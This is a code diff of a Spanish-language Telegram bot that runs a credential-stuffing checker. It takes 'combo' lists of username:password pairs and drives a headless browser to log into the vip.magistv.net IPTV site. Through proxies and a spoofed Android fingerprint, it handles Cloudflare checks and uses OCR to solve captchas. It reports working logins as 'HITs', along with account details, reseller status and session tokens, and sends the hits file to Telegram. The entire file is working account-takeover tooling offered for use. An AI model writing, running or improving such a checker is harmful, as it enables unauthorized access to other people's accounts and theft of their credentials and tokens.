-                    if not handle_cf(page, chat_id):
-                        fails += 1; stats["fails"] = fails; reason = "CF fail"; errors[reason] = errors.get(reason, 0) + 1
-                        update_progress(chat_id, msg_id, user, reason, stats); idx += 1; continue
+                    if not handle_cf(page):
+                        fails += 1; stats["fails"] += 1; errors["CF"] = errors.get("CF",0)+1
+                        update_progress(chat_id, msg_id, user, "CF fail", stats); idx += 1; continue
 
                 try:
                     el = page.locator('input[type="text"]').first
-                    el.wait_for(state="visible", timeout=3000); el.click(); time.sleep(0.1); el.fill(user)
+                    el.wait_for(state="visible", timeout=3000); el.tap(); time.sleep(0.1); el.fill(user)
                 except:
-                    fails += 1; stats["fails"] = fails; reason = "No input user"; errors[reason] = errors.get(reason, 0) + 1
-                    update_progress(chat_id, msg_id, user, reason, stats); idx += 1; continue
+                    fails += 1; stats["fails"] += 1; errors["NoInput"] = errors.get("NoInput",0)+1
+                    update_progress(chat_id, msg_id, user, "No input", stats); idx += 1; continue
 
-                time.sleep(0.2)
+                time.sleep(0.15)
                 try:
                     pw_el = page.locator('input[type="password"]').first
-                    pw_el.wait_for(state="visible", timeout=3000); pw_el.click(); time.sleep(0.1); pw_el.fill(pwd)
+                    pw_el.wait_for(state="visible", timeout=3000); pw_el.tap(); time.sleep(0.1); pw_el.fill(pwd)
                 except:
-                    fails += 1; stats["fails"] = fails; reason = "No input pass"; errors[reason] = errors.get(reason, 0) + 1
-                    update_progress(chat_id, msg_id, user, reason, stats); idx += 1; continue
+                    fails += 1; stats["fails"] += 1; errors["NoPass"] = errors.get("NoPass",0)+1
+                    update_progress(chat_id, msg_id, user, "No pass", stats); idx += 1; continue
 
-                time.sleep(0.2)
+                time.sleep(0.15)
                 login_success = False
                 for ci in range(1, 4):
                     if ci > 1:
                         state["cap_uuid"] = None; state["cap_b64"] = None
                         try:
                             img = page.locator('img[src^="data:image"]').first
-                            if img.is_visible(timeout=1000): img.click(); page.wait_for_timeout(1500)
+                            if img.is_visible(timeout=1000): img.tap(); page.wait_for_timeout(1500)
                         except: pass
-
                     if not state.get("cap_b64"):
                         pg = get_captcha_img(page)
                         if pg: state["cap_b64"] = pg
@@ -699,30 +802,26 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                         try:
                             ct = ocr_solve(ocr_engine, state["cap_b64"])
                             if ct:
-                                for sel in ['input[placeholder="validateCode"]', 'input[placeholder*="code" i]']:
+                                for sel in ['input[placeholder="validateCode"]','input[placeholder*="code" i]']:
                                     try:
                                         el = page.locator(sel).first
-                                        if el.is_visible(timeout=500):
-                                            el.click(); el.fill(""); el.fill(ct); cap_filled = True; break
+                                        if el.is_visible(timeout=500): el.tap(); el.fill(""); el.fill(ct); cap_filled = True; break
                                     except: continue
                                 if not cap_filled:
                                     try:
-                                        inputs = page.locator("input").all()
-                                        for inp in reversed(inputs):
+                                        for inp in reversed(page.locator("input").all()):
                                             tp = inp.get_attribute("type") or "text"
-                                            if tp in ("text", "") and inp.is_visible() and not inp.input_value():
-                                                inp.click(); inp.fill(""); inp.fill(ct); cap_filled = True; break
+                                            if tp in ("text","") and inp.is_visible() and not inp.input_value():
+                                                inp.tap(); inp.fill(""); inp.fill(ct); cap_filled = True; break
                                     except: pass
                         except: pass
 
                     state["clicked_at"] = time.time(); state["api_hit"] = False
-                    btn_ok = False
-                    for sel in ['button[type="submit"]', 'button:has-text("Login")', '.ant-btn-primary', 'button[class*="login"]']:
+                    for sel in ['button[type="submit"]','button:has-text("Login")','.ant-btn-primary','button[class*="login"]']:
                         try:
                             el = page.locator(sel).first
-                            if el.is_visible(timeout=500): el.click(); btn_ok = True; break
+                            if el.is_visible(timeout=500): el.tap(); break
                         except: continue
-                    if not btn_ok: state["clicked_at"] = time.time()
 
                     success = False
                     for w in range(20):
@@ -730,7 +829,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                         if "/mobile/home" in page.url: success = True; break
                         try:
                             for c in context.cookies():
-                                if "msgistv-token" in c.get("name", "") and c.get("value"): success = True; break
+                                if "msgistv-token" in c.get("name","") and c.get("value"): success = True; break
                         except: pass
                         if success: break
                         if state.get("api_hit") and state["login_code"] != 200: break
@@ -741,24 +840,24 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
 
                     if success: login_success = True; break
                     msg = (state.get("login_msg") or "").lower()
-                    if any(k in msg for k in ["captcha", "código", "codigo", "code", "valida"]):
+                    if any(k in msg for k in ["captcha","código","codigo","code","valida"]):
                         try:
-                            for sel in ['input[placeholder="validateCode"]', 'input[placeholder*="code" i]']:
+                            for sel in ['input[placeholder="validateCode"]','input[placeholder*="code" i]']:
                                 el = page.locator(sel).first
                                 if el.is_visible(timeout=400): el.fill("")
                         except: pass
                         continue
                     break
 
-                if state.get("api_hit") and is_ip_restricted(state.get("login_msg", "")):
-                    fails += 1; stats["fails"] = fails; reason = "🚫 IP restringida"; errors[reason] = errors.get(reason, 0) + 1
-                    update_progress(chat_id, msg_id, user, reason, stats); idx += 1; ip_restricted = True; break
+                if state.get("api_hit") and is_ip_restricted(state.get("login_msg","")):
+                    fails += 1; stats["fails"] += 1; errors["IP Restringida"] = errors.get("IP Restringida",0)+1
+                    update_progress(chat_id, msg_id, user, "🚫 IP restringida", stats); idx += 1; ip_restricted = True; break
 
                 if login_success or state.get("login_ok") or "/mobile/home" in page.url:
                     if not state.get("token"):
                         try:
                             for c in context.cookies():
-                                if "msgistv-token" in c.get("name", ""): state["token"] = c.get("value"); break
+                                if "msgistv-token" in c.get("name",""): state["token"] = c.get("value"); break
                         except: pass
                     try: page.goto("https://vip.magistv.net/mobile/home", wait_until="domcontentloaded", timeout=12000)
                     except: pass
@@ -771,17 +870,15 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
 
                     info = state.get("info") or {}; dash = state.get("dashboard") or {}
                     rev = "✅" if info.get("is_revendedor") else "❌"; sup = "✅" if info.get("is_super") else "❌"
-                    hit = {"username": user, "password": pwd, "info": info, "dashboard": dash, "token": state.get("token")}
-                    hits.append(hit); hits_lines.append(f"{user}:{pwd}"); stats["hits"] += 1
-
-                    detail = f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name', '—')}\n🆔 {info.get('id', '—')}\n📧 {info.get('email', '') or '—'}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 Total:{dash.get('sumNum', 0)} ✅ Act:{dash.get('activeNum', 0)}"
-                    result_str = f"💰 <b>HIT!</b> Rev={rev} Sup={sup} T={dash.get('sumNum','?')} A={dash.get('activeNum','?')}"
-                    update_progress(chat_id, msg_id, user, result_str, stats)
+                    hits.append({"username":user,"password":pwd,"info":info,"dashboard":dash,"token":state.get("token")})
+                    hits_lines.append(f"{user}:{pwd}"); stats["hits"] += 1
+                    detail = f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name','—')}\n🆔 {info.get('id','—')}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 Total:{dash.get('sumNum',0)} ✅ Act:{dash.get('activeNum',0)}"
+                    update_progress(chat_id, msg_id, user, f"💰 HIT! Rev={rev}", stats)
                     try: tg_send_msg(chat_id, detail, disable_notification=True)
                     except: pass
                     print(f"  [💰] HIT #{len(hits)} — {user}")
                 else:
-                    fails += 1; stats["fails"] = fails
+                    fails += 1; stats["fails"] += 1
                     if state.get("api_hit"): reason = translate_err(state["login_code"], state["login_msg"])
                     else:
                         pe = get_page_errors(page)
@@ -798,7 +895,6 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
 
         try: browser.close()
         except: pass
-
     return hits, hits_lines
 
 # ════════════════════════════════════════════════════════════════════════
@@ -808,207 +904,151 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
 waiting_combo = set()
 
 def start_check(accounts, chat_id, use_proxy=True):
-    if bot_state["running"]:
-        tg_send_msg(chat_id, "⏳ Ya hay un check en proceso.", reply_markup=kb_main())
-        return
+    if bot_state["running"]: tg_send_msg(chat_id, "⏳ Ocupado.", reply_markup=kb_main()); return
     if os.path.exists(STOP_FILE): os.remove(STOP_FILE)
-    bot_state["running"] = True
-    bot_state["current_chat"] = chat_id
-    bot_state["_start_time"] = time.time()
-    bot_state["debug_sent"] = 0
-
-    mode = "CON PROXY" if use_proxy else "SIN PROXY (IP VPS)"
-    tg_send_msg(chat_id, f"🚀 <b>Iniciando check {mode}...</b>\n📊 {len(accounts)} cuentas")
+    bot_state["running"] = True; bot_state["current_chat"] = chat_id
+    bot_state["_start_time"] = time.time(); bot_state["debug_sent"] = 0
+    mode = "PROXY" if use_proxy else "SIN PROXY"
+    tg_send_msg(chat_id, f"🚀 <b>Check {mode}</b>\n📊 {len(accounts)} cuentas")
     r = tg_send_msg(chat_id, "⏳ Preparando...", reply_markup=kb_cancel())
-    prog_msg_id = r.get("result", {}).get("message_id") if r.get("ok") else None
+    prog_msg_id = r.get("result",{}).get("message_id") if r.get("ok") else None
 
     def worker(accounts, chat_id, prog_msg_id, use_proxy):
         try:
             hits, hits_lines = run_checker(accounts, chat_id, prog_msg_id, use_proxy)
             elapsed = time.time() - bot_state["_start_time"]
             if hits_lines:
-                combo_text = "\n".join(hits_lines)
                 ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-                tg_send_doc(chat_id, f"hits_{ts}.txt", combo_text, caption=f"📦 {len(hits_lines)} hits — {datetime.now().strftime('%H:%M:%S')}")
-            summary = f"━━━ <b>RESUMEN FINAL</b> ━━━\n📊 Total: {len(accounts)}\n💰 Hits: <b>{len(hits_lines)}</b>\n❌ Fails: {len(accounts) - len(hits_lines)}\n⏱ {int(elapsed//60)}m {int(elapsed%60)}s\n━━━━━━━━━━━━━━━━━━━━━━━"
+                tg_send_doc(chat_id, f"hits_{ts}.txt", "\n".join(hits_lines), caption=f"📦 {len(hits_lines)} hits")
+            summary = f"━━━ <b>FIN</b> ━━━\n📊 {len(accounts)} │ 💰<b>{len(hits_lines)}</b> │ ❌{len(accounts)-len(hits_lines)}\n⏱ {int(elapsed//60)}m{int(elapsed%60)}s"
             if prog_msg_id: tg_edit_msg(chat_id, prog_msg_id, summary, reply_markup=kb_main())
             else: tg_send_msg(chat_id, summary, reply_markup=kb_main())
-            print(f"\n  [*] Check terminado: {len(hits_lines)} hits / {len(accounts)} total")
         except Exception as e:
-            err_txt = f"❌ Error: {escape_html(str(e))}"
-            print(f"  [✗] Checker error: {e}\n{traceback.format_exc()[-600:]}")
-            try: tg_send_msg(chat_id, err_txt, reply_markup=kb_main())
+            print(f"  [✗] {e}\n{traceback.format_exc()[-400:]}")
+            try: tg_send_msg(chat_id, f"❌ <code>{escape_html(str(e)[:200])}</code>", reply_markup=kb_main())
             except: pass
 
     p = multiprocessing.Process(target=worker, args=(accounts, chat_id, prog_msg_id, use_proxy), daemon=True)
-    p.start()
-    bot_state["_process"] = p
+    p.start(); bot_state["_process"] = p
 
 # ════════════════════════════════════════════════════════════════════════
-#  PROCESAR UPDATES
+#  UPDATES
 # ════════════════════════════════════════════════════════════════════════
 
 def process_update(upd):
     global ADMIN_IDS
-    msg = upd.get("message")
-    cbq = upd.get("callback_query")
+    msg = upd.get("message"); cbq = upd.get("callback_query")
 
     if msg:
-        chat_id = msg["chat"]["id"]
-        user_id = msg.get("from", {}).get("id")
-        text = msg.get("text", "")
-        is_doc = "document" in msg
-
+        chat_id = msg["chat"]["id"]; user_id = msg.get("from",{}).get("id")
+        text = msg.get("text",""); is_doc = "document" in msg
         if user_id and user_id not in ADMIN_IDS: ADMIN_IDS.append(user_id)
 
         if chat_id in waiting_combo:
             waiting_combo.discard(chat_id)
             use_proxy = not bot_state.get("force_no_proxy", False)
             bot_state["force_no_proxy"] = False
-            
             if is_doc:
-                doc = msg["document"]; file_id = doc["file_id"]
-                file_data = tg_download_file(file_id)
+                file_data = tg_download_file(msg["document"]["file_id"])
                 if file_data:
-                    combo_text = file_data.decode("utf-8", errors="ignore")
-                    accounts = parse_combo(combo_text)
-                    if accounts:
-                        tg_send_msg(chat_id, f"📄 Archivo: <b>{len(accounts)}</b> cuentas")
-                        start_check(accounts, chat_id, use_proxy)
-                    else: tg_send_msg(chat_id, "❌ Cuentas inválidas.", reply_markup=kb_main())
-                else: tg_send_msg(chat_id, "❌ Error descargando.", reply_markup=kb_main())
+                    accounts = parse_combo(file_data.decode("utf-8", errors="ignore"))
+                    if accounts: tg_send_msg(chat_id, f"📄 <b>{len(accounts)}</b> cuentas"); start_check(accounts, chat_id, use_proxy)
+                    else: tg_send_msg(chat_id, "❌ Inválidas.", reply_markup=kb_main())
+                else: tg_send_msg(chat_id, "❌ Error descarga.", reply_markup=kb_main())
                 return
             elif text and not text.startswith("/"):
                 accounts = parse_combo(text)
                 if accounts: start_check(accounts, chat_id, use_proxy)
-                else: tg_send_msg(chat_id, "❌ Formato: <code>user:pass</code>", reply_markup=kb_main())
+                else: tg_send_msg(chat_id, "❌ <code>user:pass</code>", reply_markup=kb_main())
                 return
             else:
                 waiting_combo.add(chat_id)
-                tg_send_msg(chat_id, "📤 Envía el combo (texto o .txt)", reply_markup=kb_cancel())
-                return
+                tg_send_msg(chat_id, "📤 Envía combo", reply_markup=kb_cancel()); return
 
-        if text == "/start":
-            tg_send_msg(chat_id, "🎬 <b>Flujo TV Bot</b>\n\nEnvía tu combo.", reply_markup=kb_main())
+        if text == "/start": tg_send_msg(chat_id, "🎬 <b>Flujo TV Bot</b>", reply_markup=kb_main())
         elif text == "/check":
             if bot_state["running"]: tg_send_msg(chat_id, "⏳ Ocupado.", reply_markup=kb_main())
-            else:
-                waiting_combo.add(chat_id)
-                tg_send_msg(chat_id, "📤 <b>Envía combo (CON PROXY):</b>", reply_markup=kb_cancel())
-        elif text in ["/local", "/checknoproxy"]:
+            else: waiting_combo.add(chat_id); bot_state["force_no_proxy"] = False; tg_send_msg(chat_id, "📤 Combo (PROXY):", reply_markup=kb_cancel())
+        elif text in ["/local","/checknoproxy"]:
             if bot_state["running"]: tg_send_msg(chat_id, "⏳ Ocupado.", reply_markup=kb_main())
-            else:
-                waiting_combo.add(chat_id)
-                bot_state["force_no_proxy"] = True
-                tg_send_msg(chat_id, "🌐 <b>Modo SIN PROXY (IP de tu VPS)</b>\n📤 Envía el combo:", reply_markup=kb_cancel())
+            else: waiting_combo.add(chat_id); bot_state["force_no_proxy"] = True; tg_send_msg(chat_id, "🌐 Combo (SIN PROXY):", reply_markup=kb_cancel())
         elif text == "/testcf":
-            if bot_state["running"]: tg_answer_cb(cbq["id"], "Ocupado", show_alert=True) if cbq else None
-            else: threading.Thread(target=test_cf_diagnostic, args=(chat_id,), daemon=True).start()
+            if not bot_state["running"]: threading.Thread(target=test_cf_diagnostic, args=(chat_id,), daemon=True).start()
         elif text == "/stop":
-            if bot_state["running"]:
-                with open(STOP_FILE, 'w') as f: f.write("1")
-                tg_send_msg(chat_id, "⏹ Deteniendo...")
-            else: tg_send_msg(chat_id, "No hay check.", reply_markup=kb_main())
+            if bot_state["running"]: open(STOP_FILE,'w').write("1"); tg_send_msg(chat_id, "⏹ Deteniendo...")
+            else: tg_send_msg(chat_id, "Nada corriendo.", reply_markup=kb_main())
         elif text.startswith("/proxy"):
             parts = text.split()
             if len(parts) >= 5:
-                PROXY["host"] = parts[1]; PROXY["port"] = int(parts[2]); PROXY["user"] = parts[3]; PROXY["pass"] = parts[4]
-                tg_send_msg(chat_id, f"🔄 Proxy: <code>{PROXY['host']}:{PROXY['port']}</code>", reply_markup=kb_main())
-            else: tg_send_msg(chat_id, f"Proxy:\n<code>{PROXY['host']}:{PROXY['port']}</code>\n<code>/proxy host port user pass</code>", reply_markup=kb_main())
-        elif text.startswith("/rotate"):
-            parts = text.split()
-            if len(parts) == 2:
-                global ROTATE_EVERY
-                ROTATE_EVERY = int(parts[1])
-                tg_send_msg(chat_id, f"🔁 Rotar cada {ROTATE_EVERY}", reply_markup=kb_main())
+                PROXY["host"]=parts[1]; PROXY["port"]=int(parts[2]); PROXY["user"]=parts[3]; PROXY["pass"]=parts[4]
+                tg_send_msg(chat_id, f"🔄 <code>{PROXY['host']}:{PROXY['port']}</code>", reply_markup=kb_main())
 
     elif cbq:
-        chat_id = cbq["message"]["chat"]["id"]
-        user_id = cbq.get("from", {}).get("id")
-        data = cbq.get("data", "")
-        msg_id = cbq["message"]["message_id"]
+        chat_id = cbq["message"]["chat"]["id"]; user_id = cbq.get("from",{}).get("id")
+        data = cbq.get("data",""); msg_id = cbq["message"]["message_id"]
         if user_id and user_id not in ADMIN_IDS: ADMIN_IDS.append(user_id)
-        
         if data == "send_combo":
-            if bot_state["running"]: tg_answer_cb(cbq["id"], "⏳ Ocupado", show_alert=True)
-            else:
-                waiting_combo.add(chat_id); bot_state["force_no_proxy"] = False
-                tg_edit_msg(chat_id, msg_id, "📤 <b>Envía combo (CON PROXY):</b>", reply_markup=kb_cancel())
-                tg_answer_cb(cbq["id"])
+            if bot_state["running"]: tg_answer_cb(cbq["id"],"Ocupado",show_alert=True)
+            else: waiting_combo.add(chat_id); bot_state["force_no_proxy"]=False; tg_edit_msg(chat_id,msg_id,"📤 Combo (PROXY):",reply_markup=kb_cancel()); tg_answer_cb(cbq["id"])
         elif data == "send_local":
-            if bot_state["running"]: tg_answer_cb(cbq["id"], "⏳ Ocupado", show_alert=True)
-            else:
-                waiting_combo.add(chat_id); bot_state["force_no_proxy"] = True
-                tg_edit_msg(chat_id, msg_id, "🌐 <b>Modo SIN PROXY</b>\n📤 Envía el combo:", reply_markup=kb_cancel())
-                tg_answer_cb(cbq["id"])
+            if bot_state["running"]: tg_answer_cb(cbq["id"],"Ocupado",show_alert=True)
+            else: waiting_combo.add(chat_id); bot_state["force_no_proxy"]=True; tg_edit_msg(chat_id,msg_id,"🌐 Combo (SIN PROXY):",reply_markup=kb_cancel()); tg_answer_cb(cbq["id"])
         elif data == "test_cf":
-            if not bot_state["running"]: threading.Thread(target=test_cf_diagnostic, args=(chat_id,), daemon=True).start()
-            else: tg_answer_cb(cbq["id"], "Ocupado", show_alert=True)
+            if not bot_state["running"]: threading.Thread(target=test_cf_diagnostic,args=(chat_id,),daemon=True).start()
+            else: tg_answer_cb(cbq["id"],"Ocupado",show_alert=True)
         elif data == "stop":
-            if bot_state["running"]:
-                with open(STOP_FILE, 'w') as f: f.write("1")
-                tg_answer_cb(cbq["id"], "⏹ Deteniendo...")
-            else: tg_answer_cb(cbq["id"], "No hay check", show_alert=True)
+            if bot_state["running"]: open(STOP_FILE,'w').write("1"); tg_answer_cb(cbq["id"],"Deteniendo...")
+            else: tg_answer_cb(cbq["id"],"Nada",show_alert=True)
         elif data == "cancel_check":
-            waiting_combo.discard(chat_id)
-            tg_edit_msg(chat_id, msg_id, "🎬 <b>Flujo TV Bot</b>\n\nListo.", reply_markup=kb_main())
-            tg_answer_cb(cbq["id"])
+            waiting_combo.discard(chat_id); tg_edit_msg(chat_id,msg_id,"🎬 Listo.",reply_markup=kb_main()); tg_answer_cb(cbq["id"])
 
 # ════════════════════════════════════════════════════════════════════════
 #  MAIN
 # ════════════════════════════════════════════════════════════════════════
 
 def main():
-    print()
-    print("  ╔═══════════════════════════════════════════════════╗")
-    print("  ║  🎬 Flujo TV — Telegram Bot (VPS + Xvfb)        ║")
-    print("  ╚═══════════════════════════════════════════════════╝")
-    print()
-    print("  [*] Instalando dependencias...")
+    print("\n  ╔═══════════════════════════════════════════════════╗")
+    print("  ║  🎬 Flujo TV Bot (VPS + Xvfb + Android Stealth)  ║")
+    print("  ╚═══════════════════════════════════════════════════╝\n")
+    print("  [*] Dependencias...")
     pw_ok, ocr_ok = setup_deps()
-    if not pw_ok: print("  [✗] No se pudo instalar playwright"); sys.exit(1)
+    if not pw_ok: sys.exit(1)
 
-    display = os.environ.get("DISPLAY", ":99")
-    print(f"  [*] DISPLAY={display}")
+    display = os.environ.get("DISPLAY",":99")
     try:
-        r = subprocess.run(["xdpyinfo"], capture_output=True, text=True, timeout=5)
+        r = subprocess.run(["xdpyinfo"],capture_output=True,text=True,timeout=5)
         if r.returncode != 0:
             print("  [*] Iniciando Xvfb...")
-            subprocess.Popen(["Xvfb", display, "-screen", "0", "1280x1024x24", "-ac"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen(["Xvfb",display,"-screen","0","1280x1024x24","-ac"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
             time.sleep(2)
     except FileNotFoundError:
-        subprocess.Popen(["Xvfb", display, "-screen", "0", "1280x1024x24", "-ac"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.Popen(["Xvfb",display,"-screen","0","1280x1024x24","-ac"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
         time.sleep(2)
 
-    print(f"  [✓] Playwright OK | OCR: {'✅' if ocr_ok else '❌'}")
+    print(f"  [✓] Playwright | OCR:{'✅' if ocr_ok else '❌'} | Xvfb:{display}")
     print(f"  [✓] Proxy: {PROXY['host']}:{PROXY['port']}")
-    print(f"  [✓] Comandos: /check, /local, /testcf, /stop")
-    print()
-    tg_api("deleteWebhook", {"drop_pending_updates": True})
-    print("  [✓] Bot iniciado...")
-    print()
+    print(f"  [✓] Fingerprint: Android 10 + Chrome 127 + Adreno 640")
+    print(f"  [✓] Comandos: /check /local /testcf /stop\n")
+    tg_api("deleteWebhook",{"drop_pending_updates":True})
+    print("  [✓] Bot listo.\n")
 
     offset = None
     while True:
         if bot_state["running"] and bot_state.get("_process") and not bot_state["_process"].is_alive():
-            bot_state["running"] = False; bot_state["current_chat"] = None
-            print("  [*] Check finalizado.")
+            bot_state["running"] = False; bot_state["current_chat"] = None; print("  [*] Check finalizado.")
         try:
-            params = {"timeout": 35, "allowed_updates": '["message","callback_query"]'}
+            params = {"timeout":35,"allowed_updates":'["message","callback_query"]'}
             if offset: params["offset"] = offset
-            result = tg_api("getUpdates", params, timeout=40)
+            result = tg_api("getUpdates",params,timeout=40)
             if result.get("ok") and result.get("result"):
                 for upd in result["result"]:
                     try: process_update(upd)
-                    except Exception as e: print(f"  [!] Update error: {e}")
+                    except Exception as e: print(f"  [!] {e}")
                     offset = upd["update_id"] + 1
-        except urllib.error.URLError as e:
-            print(f"  [!] Red: {e} — 5s..."); time.sleep(5)
-        except Exception as e:
-            print(f"  [!] Error: {e}"); time.sleep(3)
+        except urllib.error.URLError: time.sleep(5)
+        except: time.sleep(3)
 
 if __name__ == "__main__":
     try: main()
-    except KeyboardInterrupt: print("\n  [*] Bot detenido.")
-    except Exception as e:
-        print(f"\n  [✗] {e}"); traceback.print_exc()
+    except KeyboardInterrupt: print("\n  [*] Stop.")
+    except Exception as e: print(f"\n  [✗] {e}"); traceback.print_exc()
